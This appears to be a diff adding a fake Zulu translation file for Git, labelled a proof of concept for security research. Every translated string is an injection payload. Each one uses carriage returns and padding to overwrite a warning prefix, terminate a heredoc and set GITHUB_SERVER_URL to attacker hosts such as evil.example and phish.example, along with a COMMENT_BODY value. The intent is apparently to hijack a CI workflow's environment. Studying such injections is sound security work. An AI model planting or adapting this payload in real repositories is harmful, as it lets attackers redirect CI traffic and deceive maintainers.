@@ -1,0 +1,35 @@
+# Zulu translation for Git (POC for security research)
+# Copyright (C) 2024 Security Research
+# This file is distributed under the same license as the git package.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Git\n"
+"Report-Msgid-Bugs-To: Git Mailing List <git@vger.kernel.org>\n"
+"POT-Creation-Date: 2024-01-20 00:00+0000\n"
+"PO-Revision-Date: 2024-01-20 00:00+0000\n"
+"Last-Translator: Security Research <security@example.com>\n"
+"Language-Team: Zulu\n"
+"Language: zu\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=UTF-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+
+# Key insight: use \r to overwrite prefix on EVERY injected line!
+# Prefix is ~45 chars: "WARNING [po/zu.po@XXXXXXX]<TAB>"
+# We need padding before each \r to overwrite it
+
+#, c-format
+msgid "cannot open '%s'"
+msgstr "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEOF\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rGITHUB_SERVER_URL=https://evil.example\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rCOMMENT_BODY=## SUCCESS Injection worked!"
+
+# Shorter version in case prefix length varies
+#, c-format
+msgid "pathspec '%s' did not match any files"
+msgstr "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rEOF\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rGITHUB_SERVER_URL=https://attacker.example\nXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\rCOMMENT_BODY=PWNED"
+
+# Even more padding to be safe
+#, c-format  
+msgid "Checking out '%s'"
+msgstr "PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rEOF\nPADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rGITHUB_SERVER_URL=https://phish.example\nPADDING_PADDING_PADDING_PADDING_PADDING_PADDING_PADDING_\rCOMMENT_BODY=Phished"
